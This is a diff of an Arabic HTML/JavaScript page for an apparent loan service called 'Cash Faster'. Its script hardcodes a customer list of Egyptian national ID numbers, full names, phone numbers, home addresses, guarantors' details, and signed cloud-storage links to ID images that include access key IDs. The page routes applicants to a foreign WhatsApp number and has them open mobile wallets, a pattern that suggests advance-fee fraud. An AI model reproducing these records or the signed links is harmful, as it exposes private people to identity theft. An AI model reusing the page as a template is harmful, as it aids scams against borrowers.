+    border-radius: 12px;
+    background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+    color: #FFFFFF;
+    font-weight: 900;
+    font-size: 1.1rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+    box-shadow: 0 4px 12px rgba(26,140,74,0.25);
+  }
+  .step-cards .step-card .step-content { flex: 1; padding-top: 0.1rem; }
+  .step-cards .step-card .step-content .step-title {
+    font-size: 0.88rem;
+    font-weight: 800;
+    color: var(--text);
+    margin-bottom: 0.15rem;
+    line-height: 1.4;
+  }
+  .step-cards .step-card .step-content .step-desc {
+    font-size: 0.75rem;
+    color: var(--text-muted);
+    line-height: 1.7;
+  }
+  .step-cards .step-card .step-content .step-desc strong { color: var(--primary-dark); font-weight: 800; }
+  .step-cards .step-card .step-content .step-desc .gold-text { color: var(--gold-dark); font-weight: 800; }
+
+  /* ===== خطوات فودافون ===== */
+  .step-cards.vodafone .step-card::before {
+    background: linear-gradient(180deg, var(--vodafone-red), #B30000);
+  }
+  .step-cards.vodafone .step-card:hover {
+    border-color: var(--vodafone-red);
+    box-shadow: 0 4px 16px rgba(230,0,0,0.1);
+  }
+  .step-cards.vodafone .step-card .step-num {
+    background: linear-gradient(135deg, var(--vodafone-red), #B30000);
+    box-shadow: 0 4px 12px rgba(230,0,0,0.25);
+  }
+  .step-cards.vodafone .step-card .step-content .step-desc strong { color: var(--vodafone-red); }
+
+  .amount-box {
+    background: linear-gradient(135deg, var(--primary-light), #F5FBF7);
+    border: 1px solid rgba(26,140,74,0.15);
+    border-radius: var(--radius-sm);
+    padding: 0.9rem;
+    margin: 0.8rem 0;
+    text-align: center;
+  }
+  .amount-box .amount-label { font-size: 0.75rem; color: var(--text-muted); font-weight: 600; }
+  .amount-box .amount-value { font-size: 1.5rem; font-weight: 900; color: var(--primary-dark); margin: 0.2rem 0; line-height: 1.1; }
+  .amount-box .amount-sub { font-size: 0.68rem; color: var(--text-muted); }
+
+  /* ===== صندوق مبلغ فودافون ===== */
+  .amount-box.vodafone {
+    background: linear-gradient(135deg, var(--vodafone-light), #FFF5F5);
+    border-color: rgba(230,0,0,0.15);
+  }
+  .amount-box.vodafone .amount-value { color: var(--vodafone-red); }
+
+  .open-wallet-box {
+    background: linear-gradient(135deg, #FFFFFF, var(--warning-light));
+    border: 2px solid var(--warning);
+    border-radius: var(--radius);
+    padding: 1.3rem 1.1rem;
+    margin: 0.9rem 0;
+    box-shadow: var(--shadow-sm);
+    position: relative;
+    overflow: hidden;
+  }
+  .open-wallet-box .ow-header {
+    display: flex;
+    align-items: center;
+    gap: 0.7rem;
+    margin-bottom: 0.9rem;
+    padding-bottom: 0.8rem;
+    border-bottom: 1px solid rgba(217,119,6,0.2);
+  }
+  .open-wallet-box .ow-header .ow-icon {
+    width: 46px;
+    height: 46px;
+    background: linear-gradient(135deg, var(--warning), #B45309);
+    border-radius: 13px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #FFFFFF;
+    font-size: 1.3rem;
+    flex-shrink: 0;
+    box-shadow: 0 4px 12px rgba(217,119,6,0.25);
+  }
+  .open-wallet-box .ow-header h3 { font-size: 1rem; font-weight: 800; color: var(--warning); line-height: 1.3; }
+  .open-wallet-box .ow-header p { font-size: 0.7rem; color: var(--text-muted); margin-top: 0.1rem; }
+
+  .open-wallet-box .ow-body .greeting { font-size: 0.9rem; font-weight: 800; color: var(--text); margin-bottom: 0.5rem; }
+  .open-wallet-box .ow-body .main-notice {
+    background: #FFFFFF;
+    border-right: 4px solid var(--warning);
+    border-radius: 0.7rem;
+    padding: 0.8rem 1rem;
+    margin: 0.7rem 0;
+    font-size: 0.85rem;
+    line-height: 1.9;
+    color: var(--text);
+  }
+  .open-wallet-box .ow-body .main-notice strong { color: var(--warning); font-weight: 800; }
+  .open-wallet-box .ow-body .main-notice .danger-text { color: var(--danger); font-weight: 800; }
+
+  .open-wallet-box .ow-steps { display: flex; flex-direction: column; gap: 0.6rem; margin: 0.8rem 0; }
+  .open-wallet-box .ow-steps .ow-step {
+    display: flex;
+    align-items: flex-start;
+    gap: 0.7rem;
+    padding: 0.8rem 0.9rem;
+    background: #FFFFFF;
+    border: 1.5px solid rgba(217,119,6,0.15);
+    border-radius: var(--radius-sm);
+    font-size: 0.82rem;
+    line-height: 1.7;
+    color: var(--text);
+  }
+  .open-wallet-box .ow-steps .ow-step .ow-num {
+    min-width: 32px;
+    height: 32px;
+    border-radius: 10px;
+    background: linear-gradient(135deg, var(--warning), #B45309);
+    color: #FFFFFF;
+    font-weight: 800;
+    font-size: 0.9rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+  }
+  .open-wallet-box .ow-steps .ow-step strong { color: var(--warning); font-weight: 800; }
+
+  .open-wallet-box .ow-timer-note {
+    background: #FFFFFF;
+    border: 1.5px dashed var(--warning);
+    border-radius: var(--radius-sm);
+    padding: 0.7rem 1rem;
+    margin: 0.7rem 0;
+    text-align: center;
+    font-size: 0.8rem;
+    color: var(--warning);
+    font-weight: 800;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 0.5rem;
+  }
+
+  .open-wallet-box .ow-apology {
+    background: linear-gradient(135deg, var(--danger-light), #FEF2F2);
+    border: 1px solid rgba(220,38,38,0.2);
+    border-radius: var(--radius-sm);
+    padding: 0.7rem 0.9rem;
+    margin: 0.7rem 0;
+    font-size: 0.78rem;
+    color: var(--danger);
+    font-weight: 700;
+    text-align: center;
+    line-height: 1.8;
+  }
+
+  /* ===== خيارات فتح المحفظة ===== */
+  .wallet-options {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 0.7rem;
+    margin: 0.9rem 0;
+  }
+  .wallet-options .wallet-opt {
+    background: #FFFFFF;
+    border: 2px solid var(--border);
+    border-radius: var(--radius-sm);
+    padding: 0.9rem 0.6rem;
+    text-align: center;
+    transition: 0.25s;
+  }
+  .wallet-options .wallet-opt .wo-icon {
+    width: 44px; height: 44px;
+    border-radius: 12px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 1.3rem;
+    color: #FFFFFF;
+    margin: 0 auto 0.5rem;
+  }
+  .wallet-options .wallet-opt.etisalat .wo-icon { background: linear-gradient(135deg, var(--etisalat-blue), #0369A1); }
+  .wallet-options .wallet-opt.vodafone .wo-icon { background: linear-gradient(135deg, var(--vodafone-red), #B30000); }
+  .wallet-options .wallet-opt .wo-name { font-size: 0.82rem; font-weight: 800; color: var(--text); }
+  .wallet-options .wallet-opt .wo-hint { font-size: 0.62rem; color: var(--text-muted); margin-top: 0.2rem; line-height: 1.6; }
+
+  .transparency-box {
+    background: linear-gradient(135deg, var(--info-light), #EFF6FF);
+    border: 1px solid rgba(37,99,235,0.2);
+    border-radius: var(--radius);
+    padding: 1.1rem;
+    margin: 0.9rem 0;
+  }
+  .transparency-box .trans-header {
+    display: flex;
+    align-items: center;
+    gap: 0.6rem;
+    margin-bottom: 0.7rem;
+  }
+  .transparency-box .trans-header i { color: var(--info); font-size: 1.3rem; }
+  .transparency-box .trans-header h4 { font-size: 0.9rem; font-weight: 800; color: var(--info); }
+  .transparency-box ul { list-style: none; padding: 0; }
+  .transparency-box ul li {
+    display: flex;
+    align-items: flex-start;
+    gap: 0.5rem;
+    padding: 0.35rem 0;
+    font-size: 0.78rem;
+    color: var(--text);
+    line-height: 1.7;
+  }
+  .transparency-box ul li i { color: var(--success); font-size: 0.85rem; margin-top: 0.35rem; flex-shrink: 0; }
+
+  .btn-whatsapp {
+    width: 100%;
+    padding: 0.95rem;
+    border: none;
+    border-radius: 3rem;
+    background: linear-gradient(135deg, #25D366, #128C7E);
+    color: #FFFFFF;
+    font-weight: 800;
+    font-size: 0.95rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 0.6rem;
+    cursor: pointer;
+    transition: 0.25s;
+    box-shadow: 0 6px 20px rgba(37,211,102,0.25);
+    margin-top: 0.8rem;
+    font-family: var(--font);
+  }
+  .btn-whatsapp:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(37,211,102,0.4); }
+
+  .btn-upload {
+    width: 100%;
+    padding: 0.95rem;
+    border: none;
+    border-radius: 3rem;
+    background: linear-gradient(135deg, var(--gold), var(--gold-dark));
+    color: #FFFFFF;
+    font-weight: 800;
+    font-size: 0.95rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 0.7rem;
+    cursor: pointer;
+    transition: 0.25s;
+    box-shadow: 0 6px 20px rgba(184,145,46,0.25);
+    margin-top: 0.8rem;
+    font-family: var(--font);
+  }
+  .btn-upload:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(184,145,46,0.4); }
+
+  .error-box {
+    background: var(--danger-light);
+    border: 1px solid rgba(220,38,38,0.2);
+    border-radius: var(--radius);
+    padding: 1.2rem;
+    text-align: center;
+    color: var(--danger);
+    font-size: 0.85rem;
+    display: none;
+    margin-top: 0.8rem;
+    font-weight: 600;
+    line-height: 1.8;
+  }
   .error-box i { font-size: 1.8rem; display: block; margin-bottom: 0.4rem; }
+
   .loader { text-align: center; display: none; padding: 1.5rem 0; }
   .loader i { color: var(--primary); font-size: 2rem; }
   .loader p { color: var(--text-muted); font-size: 0.8rem; margin-top: 0.4rem; font-weight: 600; }
-  .admin-panel { display: none; background: var(--bg-soft); border-radius: var(--radius); padding: 1rem; margin: 0.8rem 0; border: 1px solid var(--border); }
-  .admin-panel.show { display: block; }
-  .admin-panel .admin-title { font-size: 0.85rem; color: var(--gold-dark); font-weight: 800; margin-bottom: 0.7rem; text-align: center; }
-  .admin-panel .btn-group { display: flex; gap: 0.4rem; flex-wrap: wrap; }
-  .admin-panel .btn-group button { flex: 1; min-width: 90px; padding: 0.5rem 0.6rem; border: none; border-radius: 3rem; font-size: 0.7rem; font-weight: 700; cursor: pointer; font-family: var(--font); color: #FFFFFF; }
-  .btn-status-approved { background: var(--success); }
-  .btn-status-review { background: var(--warning); }
-  .btn-status-rejected { background: var(--danger); }
-  .btn-status-invalid { background: var(--invalid-color); }
-  .btn-status-pending-approval { background: var(--pending-approval); }
-  .admin-status-current { font-size: 0.7rem; color: var(--text-muted); text-align: center; margin-top: 0.5rem; font-weight: 600; }
+
   @media (max-width: 440px) {
     body { padding: 0.6rem; }
     .app-container { padding: 1rem 0.9rem; border-radius: 1.6rem; }
     .watermark::before { font-size: 5rem; }
     .watermark::after { font-size: 1rem; line-height: 3rem; }
     .loan-card .loan-amount-main { font-size: 2.2rem; }
+    .loan-details-grid { gap: 0.4rem; }
+    .loan-details-grid .detail-item .value { font-size: 0.78rem; }
     .search-box { flex-direction: column; }
     .search-box button { width: 100%; justify-content: center; }
     .brand h1 { font-size: 1.15rem; }
     .brand .icon { width: 42px; height: 42px; font-size: 1.3rem; }
+    .promo-strip { font-size: 0.62rem; padding: 0.45rem 0.8rem; }
     .client-info .row { font-size: 0.78rem; }
+    .step-cards .step-card { padding: 0.8rem 0.85rem; }
+    .step-cards .step-card .step-num { min-width: 36px; height: 36px; font-size: 1rem; }
+    .open-wallet-box .ow-steps .ow-step { font-size: 0.76rem; padding: 0.7rem 0.8rem; }
+    .wallet-options { grid-template-columns: 1fr; }
+  }
+  @media (max-width: 360px) {
+    .loan-card .loan-amount-main { font-size: 1.8rem; }
+    .loan-details-grid { grid-template-columns: 1fr 1fr; }
+    .header .badge { display: none; }
   }
 </style>
 </head>
@@ -184,7 +883,7 @@
     </div>
 
     <div class="header">
-      <div class="brand" id="brandLogo">
+      <div class="brand">
         <div class="icon"><i class="fas fa-bolt"></i></div>
         <h1>Cash Faster<span>كاش فاستر</span></h1>
       </div>
@@ -195,11 +894,12 @@
     </div>
 
     <div class="nav-tabs">
-      <div class="tab active"><i class="fas fa-search"></i> 🔍 استعلام عن الطلب</div>
-      <div class="tab"><i class="fas fa-list-check"></i> 📋 خطوات التسييل</div>
+      <div class="tab active"><i class="fas fa-list-check"></i> 📋 خطوات التسييل</div>
+      <div class="tab"><i class="fas fa-cloud-upload-alt"></i> 📤 رفع التأكيدات</div>
       <div class="tab"><i class="fas fa-shield-halved"></i> 🛡️ شفافية وأمان</div>
     </div>
 
+    <!-- صندوق البحث -->
     <div class="search-box">
       <input type="text" id="nationalId" placeholder="🔢 أدخل الرقم القومي (14 رقم)" maxlength="14" inputmode="numeric">
       <button onclick="searchCustomer()"><i class="fas fa-search"></i> 🔍 استعلام</button>
@@ -217,36 +917,130 @@
       <p>⏳ جاري جلب بيانات طلبك...</p>
     </div>
 
-    <div class="admin-panel" id="adminPanel">
-      <div class="admin-title"><i class="fas fa-cog"></i> ⚙️ تغيير حالة الطلب</div>
-      <div class="btn-group">
-        <button class="btn-status-approved" onclick="changeStatus('approved')">✅ موافقة</button>
-        <button class="btn-status-review" onclick="changeStatus('review')">⏳ مراجعة</button>
-        <button class="btn-status-rejected" onclick="changeStatus('rejected')">❌ رفض</button>
-        <button class="btn-status-invalid" onclick="changeStatus('invalid')">⚠️ بيانات غير صحيحة</button>
-        <button class="btn-status-pending-approval" onclick="changeStatus('pending-approval')">🔄 قيد الموافقة</button>
-      </div>
-      <div class="admin-status-current" id="adminStatusDisplay">الحالة الحالية: <span id="currentStatusText">غير محدد</span></div>
-    </div>
-
   </div>
 
 <script>
+  // ================================================================
+  //  إعدادات عامة
+  // ================================================================
   const WHATSAPP_NUMBER = "+12519108713";
   const WHATSAPP_URL = `https://wa.me/${WHATSAPP_NUMBER}`;
+  const SURVEY_URL = "https://surveymars.com/q/dFK8HIBuh";
 
   // ================================================================
-  //  قاعدة البيانات — جميع العملاء الجدد من الملف
-  //  hasEtisalat / hasVodafone: false,false = "لا يوجد - سيفتحها"
+  //  قاعدة البيانات — جميع العملاء من الملف
   // ================================================================
-  const customersDatabase = {
-    "29401122600339": { id: "29401122600339", name: "محمود عثمان محمد الزهرى", job: "نجار مسلح", loan: 35000, loanTerm: "12 شهر", installment: "3875", total: "46500 ج.م", hasEtisalat: true, hasVodafone: false, wallet: "اتصالات كاش", walletNum: "01115460649", status: "approved", idVerificationImage: "https://ossprivate.surveymars.com/answer/mJABbmvkQ/s_2_q16_5668655447624922766.jpg?response-content-disposition=attachment%3Bfilename%3D2_16_inbound717511713917758637.jpg&Expires=1793945608&OSSAccessKeyId=LTAI5tCPbxY48BbJtHn4QcZK&Signature=FyKGhOaFYtkb0G5uZ0JR6A%2BJ%2FGQ%3D", guarantor: { name: "محمد عثمان محمد الزهرى", relation: "أخ", phone: "01040883985" }, address: "قرية الجزازرة مركز المراغة محافظة سوهاج" },
-    "2700912085": { id: "27009202085", name: "هاله العزب ابراهيم العزب", job: "ربه منزل بشتغل اون لاين", loan: 160000, loanTerm: "48 شهر", installment: "4435", total: "212880 ج.م", hasEtisalat: false, hasVodafone: false, wallet: "لا يوجد - سيفتحها", walletNum: "01107098779", status: "approved", idVerificationImage: "https://ossprivate.surveymars.com/answer/mJABbmvkQ/s_3_q16_4972040725888338880.jpg?response-content-disposition=attachment%3Bfilename%3D3_16_inbound6971294268589880785.jpg&Expires=1793945608&OSSAccessKeyId=LTAI5tCPbxY48BbJtHn4QcZK&Signature=cVbzjx4wy2rDNEWidkFWJppSUuY%3D", guarantor: { name: "هبه عبد الرؤوف حسن ابرهيم القشلان", relation: "ابنة", phone: "01034262283" }, address: "ميت العامل مركز اجا محافظة الدقهلية" },
-    "26503011100767": { id: "26503011100767", name: "بسيمه سعد محمد سلامه", job: "كبير معلمين بالمعاش", loan: 200000, loanTerm: "60 شهر", installment: "4440", total: "266400 ج.م", hasEtisalat: false, hasVodafone: false, wallet: "لا يوجد - سيفتحها", walletNum: "01093752935", status: "approved", idVerificationImage: "https://ossprivate.surveymars.com/answer/mJABbmvkQ/s_3_q16_5727682234925826793.jpg?response-content-disposition=attachment%3Bfilename%3D4_16_inbound392593090236323131.jpg&Expires=1793945608&OSSAccessKeyId=LTAI5tCPbxY48BbJtHn4QcZK&Signature=lAiG0vdtpEJGZqZwrckcjgYmUac%3D", guarantor: { name: "أشرف سعد محمد سلامه", relation: "أخ", phone: "01031268164" }, address: "دمياط الجديده شارع الامارات بجوار مسجد نور" },
-    "29202052103054": { id: "29202052103054", name: "كامل مجدى كامل محمد", job: "مندوب مبيعات شركة أبتا للتجارة أوت سويرس فى شركة كونتكت نا", loan: 200000, loanTerm: "60 شهر", installment: "4440", total: "266400 ج.م", hasEtisalat: false, hasVodafone: false, wallet: "لا يوجد - سيفتحها", walletNum: "01020488212", status: "approved", idVerificationImage: "https://ossprivate.surveymars.com/answer/mJABbmvkQ/s_5_q16_5034207133124112555.jpg?response-content-disposition=attachment%3Bfilename%3D5_16_inbound5964923565598722539.jpg&Expires=1793945608&OSSAccessKeyId=LTAI5tCPbxY48BbJtHn4QcZK&Signature=YNGD39U9i9pCMAqDw0Y2R9Xuk2I%3D", guarantor: { name: "فاتن مجدى كامل محمد", relation: "أخت", phone: "01155715833" }, address: "١١ شارع الهرم ميت عقبة العجوزة الجيزة بعد نادى الزمالك بوابة رقم ٣ بالقرب من كشرى الجزيرة" },
-    "28011171803311": { id: "28011171803311", name: "محمود محمد محمود سالم", job: "مدير إدارة بشركة بتروتريد للخدمات البترولية فرع الهرم ١٧١ الرئيسى أعلى بنك مصر امام كنتاكى", loan: 200000, loanTerm: "60 شهر", installment: "4440", total: "266400 ج.م", hasEtisalat: false, hasVodafone: false, wallet: "لا يوجد - سيفتحها", walletNum: "01157932278", status: "approved", idVerificationImage: "https://ossprivate.surveymars.com/answer/mJABbmvkQ/s_6_q16_5597553928959844693.jpg?response-content-disposition=attachment%3Bfilename%3D6_16_inbound6211108583759126180.jpg&Expires=1793945608&OSSAccessKeyId=LTAI5tCPbxY48BbJtHn4QcZK&Signature=Ee18V7VIsvqPsAAL%2BcRJlsCZboU%3D", guarantor: { name: "منة الله محمود محمد محمود سالم", relation: "ابنة", phone: "01029920109" }, address: "محافظة الجيزة ٦ أكتوبر التوسعات الشمالية كومباوند إطلالة عمارة ٤٥ شقة ٤" },
-    "27907141702839": { id: "27907141702839", name: "طارق محروس محمد سلامة", job: "سائق", loan: 40000, loanTerm: "18 شهر", installment: "2965", total: "53370 ج.م", hasEtisalat: true, hasVodafone: false, wallet: "اتصالات كاش", walletNum: "01016868389", status: "approved", idVerificationImage: "https://ossprivate.surveymars.com/answer/mJABbmvkQ/s_1_q16_5166188755975827241.jpg?response-content-disposition=attachment%3Bfilename%3D1_16_inbound4877800497125790983.jpg&Expires=1793945608&OSSAccessKeyId=LTAI5tCPbxY48BbJtHn4QcZK&Signature=jrX2UGCMMaKtJitHW3LTaEioJRs%3D", guarantor: { name: "سمر إبراهيم محروس", relation: "زوجة", phone: "01556578851" }, address: "11 محمود مشرف" },
-    // ===== العملاء الجدد من الملف =====
+const customersDatabase = {
+
+// ===== العميل 1 =====
+"29401122600339": {
+  id: "29401122600339",
+  name: "محمود عثمان محمد الزهرى",
+  job: "نجار مسلح",
+  loan: 35000,
+  loanTerm: "12 شهر",
+  installment: "3875",
+  total: "46500 ج.م",
+  hasEtisalat: true,
+  hasVodafone: false,
+  wallet: "اتصالات كاش",
+  walletNum: "01115460649",
+  status: "approved",
+  idVerificationImage: "https://ossprivate.surveymars.com/answer/mJABbmvkQ/s_2_q16_5668655447624922766.jpg?response-content-disposition=attachment%3Bfilename%3D2_16_inbound717511713917758637.jpg&Expires=1793945608&OSSAccessKeyId=LTAI5tCPbxY48BbJtHn4QcZK&Signature=FyKGhOaFYtkb0G5uZ0JR6A%2BJ%2FGQ%3D",
+  guarantor: { name: "محمد عثمان محمد الزهرى", relation: "أخ", phone: "01040883985" },
+  address: "قرية الجزازرة مركز المراغة محافظة سوهاج"
+},
+// ===== العميل 2 =====
+"2700917085": {
+  id: "27009171202085",
+  name: "هاله العزب ابراهيم العزب",
+  job: "ربه منزل بشتغل اون لاين",
+  loan: 160000,
+  loanTerm: "48 شهر",
+  installment: "4435",
+  total: "212880 ج.م",
+  hasEtisalat: false,
+  hasVodafone: true,
+  wallet: "فودافون كاش",
+  walletNum: "01034262283",
+  status: "approved",
+  idVerificationImage: "https://ossprivate.surveymars.com/answer/mJABbmvkQ/s_3_q16_4972040725888338880.jpg?response-content-disposition=attachment%3Bfilename%3D3_16_inbound6971294268589880785.jpg&Expires=1793945608&OSSAccessKeyId=LTAI5tCPbxY48BbJtHn4QcZK&Signature=cVbzjx4wy2rDNEWidkFWJppSUuY%3D",
+  guarantor: { name: "هبه عبد الرؤوف حسن ابرهيم القشلان", relation: "ابنة", phone: "01034262283" },
+  address: "ميت العامل مركز اجا محافظة الدقهلية"
+},
+// ===== العميل 3 =====
+"26503011100767": {
+  id: "26503011100767",
+  name: "بسيمه سعد محمد سلامه",
+  job: "حاليا على المعاش",
+  loan: 200000,
+  loanTerm: "60 شهر",
+  installment: "4440",
+  total: "266400 ج.م",
+  hasEtisalat: false,
+  hasVodafone: true,
+  wallet: "فودافون كاش",
+  walletNum: "01093752935",
+  status: "approved",
+  idVerificationImage: "https://ossprivate.surveymars.com/answer/mJABbmvkQ/s_3_q16_5727682234925826793.jpg?response-content-disposition=attachment%3Bfilename%3D4_16_inbound392593090236323131.jpg&Expires=1793945608&OSSAccessKeyId=LTAI5tCPbxY48BbJtHn4QcZK&Signature=lAiG0vdtpEJGZqZwrckcjgYmUac%3D",
+  guarantor: { name: "أشرف سعد محمد سلامه", relation: "أخ", phone: "01031268164" },
+  address: "دمياط الجديده شارع الامارات بجوار مسجد نور"
+},
+// ===== العميل 4 =====
+"29202052103054": {
+  id: "29202052103054",
+  name: "كامل مجدى كامل محمد",
+  job: "مندوب مبيعات شركة أبتا للتجارة أوت سويرس فى شركة كونتكت نا",
+  loan: 200000,
+  loanTerm: "60 شهر",
+  installment: "4440",
+  total: "266400 ج.م",
+  hasEtisalat: false,
+  hasVodafone: false,
+  wallet: "لا يوجد - سيفتحها",
+  walletNum: "01020488212",
+  status: "approved",
+  idVerificationImage: "https://ossprivate.surveymars.com/answer/mJABbmvkQ/s_5_q16_5034207133124112555.jpg?response-content-disposition=attachment%3Bfilename%3D5_16_inbound5964923565598722539.jpg&Expires=1793945608&OSSAccessKeyId=LTAI5tCPbxY48BbJtHn4QcZK&Signature=YNGD39U9i9pCMAqDw0Y2R9Xuk2I%3D",
+  guarantor: { name: "فاتن مجدى كامل محمد", relation: "أخت", phone: "01155715833" },
+  address: "١١ شارع الهرم ميت عقبة العجوزة الجيزة بعد نادى الزمالك بوابة رقم ٣ بالقرب من كشرى الجزيرة"
+},
+// ===== العميل 5 =====
+"28011171803311": {
+  id: "28011171803311",
+  name: "محمود محمد محمود سالم",
+  job: "مدير إدارة بشركة بتروتريد للخدمات البترولية فرع الهرم ١٧١ الرئيسى أعلى بنك مصر امام كنتاكى",
+  loan: 200000,
+  loanTerm: "60 شهر",
+  installment: "4440",
+  total: "266400 ج.م",
+  hasEtisalat: false,
+  hasVodafone: false,
+  wallet: "لا يوجد - سيفتحها",
+  walletNum: "01157932278",
+  status: "approved",
+  idVerificationImage: "https://ossprivate.surveymars.com/answer/mJABbmvkQ/s_6_q16_5597553928959844693.jpg?response-content-disposition=attachment%3Bfilename%3D6_16_inbound6211108583759126180.jpg&Expires=1793945608&OSSAccessKeyId=LTAI5tCPbxY48BbJtHn4QcZK&Signature=Ee18V7VIsvqPsAAL%2BcRJlsCZboU%3D",
+  guarantor: { name: "منة الله محمود محمد محمود سالم", relation: "ابنة", phone: "01029920109" },
+  address: "محافظة الجيزة ٦ أكتوبر التوسعات الشمالية كومباوند إطلالة عمارة ٤٥ شقة ٤"
+},
+// ===== العميل 6 =====
+"27907141702839": {
+  id: "27907141702839",
+  name: "طارق محروس محمد سلامة",
+  job: "سائق",
+  loan: 40000,
+  loanTerm: "18 شهر",
+  installment: "2965",
+  total: "53370 ج.م",
+  hasEtisalat: true,
+  hasVodafone: false,
+  wallet: "اتصالات كاش",
+  walletNum: "01016868389",
+  status: "approved",
+  idVerificationImage: "https://ossprivate.surveymars.com/answer/mJABbmvkQ/s_1_q16_5166188755975827241.jpg?response-content-disposition=attachment%3Bfilename%3D1_16_inbound4877800497125790983.jpg&Expires=1793945608&OSSAccessKeyId=LTAI5tCPbxY48BbJtHn4QcZK&Signature=jrX2UGCMMaKtJitHW3LTaEioJRs%3D",
+  guarantor: { name: "سمر إبراهيم محروس", relation: "زوجة", phone: "01556578851" },
+  address: "11 محمود مشرف"
+},
+// ===== العملاء الجدد من الملف =====
 
 // 1
 "28207251900611": {
@@ -303,7 +1097,7 @@
   address: "عرب، العيايدة مركز الخانكة القليوبية"
 },
 // 4
-"2761021631": {
+"2761023631": {
   id: "27610231201631",
   name: "مصطفى على ذكر على",
   job: "الفيروز/ شرم الشيخ - موظف قطاع خاص",
@@ -340,7 +1134,7 @@
 },
 // 6
 "2861221198": {
-  id: "286122198",
+  id: "2861101198",
   name: "محسن حسن اسماعيل محمد",
   job: "مدير قطاع المشروعات بمؤسسة اجياد للمقاولات - موظف قطاع خاص",
   loan: 200000,
@@ -357,7 +1151,7 @@
   address: "مدينة الفسطاط عماره 102"
 },
 // 7
-"2761200757": {
+"27612000757": {
   id: "27612012700757",
   name: "محمد محمود طه محمود",
   job: "تلي سيلز شركة كونسنتركس - موظف قطاع خاص",
@@ -393,8 +1187,8 @@
   address: "42ش عصمت المعادي"
 },
 // 9
-"29807005134": {
-  id: "2980705134",
+"2980705134": {
+  id: "29807080105134",
   name: "محمدبخيت محمداحمد",
   job: "بيع ملابس جاهز من البيت وبنزل الاسوق - عمل حر",
   loan: 100000,
@@ -483,26 +1277,26 @@
   address: "العجمى الحديد والصلب عند حلوانى اية"
 },
 // 14
-"28002204479": {
-  id: "28000104479",
+"2800104479": {
+  id: "28002260104479",
   name: "محمد سيد محمد عبد الواحد",
   job: "موظف بشركة مصر للبترول - موظف حكومى",
   loan: 150000,
   loanTerm: "48 شهر",
   installment: "4205",
   total: "201840 ج.م",
-  hasEtisalat: false,
+  hasEtisalat: true,
   hasVodafone: false,
-  wallet: "لا يوجد - سيفتحها",
-  walletNum: "5078086750828654",
+  wallet: "اتصالات كاش",
+  walletNum: "01117560121",
   status: "approved",
   idVerificationImage: "https://i.postimg.cc/rwrWv2Pz/14-16-inbound1216827915175716129.jpg",
   guarantor: { name: "سهام حامد ابراهيم امان", relation: "زوجة", phone: "01204156962" },
   address: "٨ شارع فواد مرقص متفرع من شارع حسنى وشارع شركات الشرابية"
 },
 // 15
-"2711203277": {
-  id: "271010203277",
+"2711103277": {
+  id: "27111010203277",
   name: "محمد ابراهيم عبد الكريم محمد",
   job: "مدير عام مساعد بشركة الاسكندرية للبترول - موظف حكومى",
   loan: 40000,
@@ -510,17 +1304,17 @@
   installment: "2965",
   total: "53370 ج.م",
   hasEtisalat: false,
-  hasVodafone: false,
-  wallet: "لا يوجد - سيفتحها",
-  walletNum: "01222496604",
+  hasVodafone: true,
+  wallet: "فودافون كاش",
+  walletNum: "01035250043",
   status: "approved",
   idVerificationImage: "https://i.postimg.cc/25XDvgCh/15-16-inbound8971202774138541097.jpg",
   guarantor: { name: "ثريا فتحى شحاته مصطفى", relation: "زوجة", phone: "01224570377" },
   address: "مدينة اسيد سموحة سيدى جابر ااسكندرية"
 },
 // ===== العميل الجديد: أحمد محمد سليمان محمد =====
-"289121200356": {
-  id: "289120100356",
+"2891200356": {
+  id: "28912120100356",
   name: "أحمد محمد سليمان محمد",
   job: "نجات في شركه ماچور للمقاولات (عمل حر)",
   loan: 40000,
@@ -538,8 +1332,8 @@
   address: "ش محمود منتاوي المطريه القاهره"
 },
 // ===== العميل الجديد: حسن طلعت حسن اسماعيل =====
-"29006190101136": {
-  id: "29006190101136",
+"29009160101136": {
+  id: "29009160101136",
   name: "حسن طلعت حسن اسماعيل",
   job: "عمل حر - عندي عربيه شغال بيها وشريك في مخبز",
   loan: 200000,
@@ -555,100 +1349,47 @@
   idVerificationImage: "https://i.postimg.cc/ry3RWYYh/18-16-inbound8739167916959037848.jpg",
   guarantor: { name: "رانيا عطيه رجب ابراهيم", relation: "زوجة", phone: "29010100101526" },
   address: "34 شارع عمر المختار الاميريه"
-}, 
-
-  };
+},
+};
 
   let currentClient = null;
-  let currentNationalId = '';
-  let isAdmin = false;
-  let adminClickCount = 0;
 
   function calculateTotal(client) {
-    let totalDisplay = client.total || "يحدد لاحقاً";
-    if (client.loan && client.loanTerm) {
-      const termMatch = String(client.loanTerm).match(/(\d+)/);
-      if (termMatch) {
-        const months = parseInt(termMatch[0]);
-        if (months > 0 && client.installment) {
-          const installmentNum = parseFloat(String(client.installment).replace(/,/g, ''));
-          if (!isNaN(installmentNum)) {
-            totalDisplay = (installmentNum * months).toFixed(0) + " ج.م";
-          }
-        }
-      }
-    }
-    return totalDisplay;
+    return client.total || "يحدد لاحقاً";
   }
 
-  // ===== رسالة واتساب حسب نوع المحفظة =====
-  function openWhatsApp() {
-    if (!currentClient) { window.open(WHATSAPP_URL, '_blank'); return; }
-    const hasEtisalat = currentClient.hasEtisalat || false;
-    const hasVodafone = currentClient.hasVodafone || false;
-    const loanAmount = typeof currentClient.loan === 'number' ? currentClient.loan.toLocaleString('ar-EG') : currentClient.loan;
+  // ===== تحديد نوع المحفظة =====
+  function getWalletType(client) {
+    if (client.hasEtisalat) return 'etisalat';
+    if (client.hasVodafone) return 'vodafone';
+    return 'none';
+  }
 
-    let msg = `السلام عليكم ورحمة الله وبركاته 👋\n\n👤 أنا أسمى: ${currentClient.name}\n🔢 رقمي القومي: ${currentClient.id || currentNationalId}\n💰 مبلغ القرض المعتمد: ${loanAmount} ج.م\n💵 القسط الشهري: ${currentClient.installment || "يحدد لاحقاً"} ج.م\n📅 مدة القسط: ${currentClient.loanTerm || "يحدد لاحقاً"}\n\n`;
-
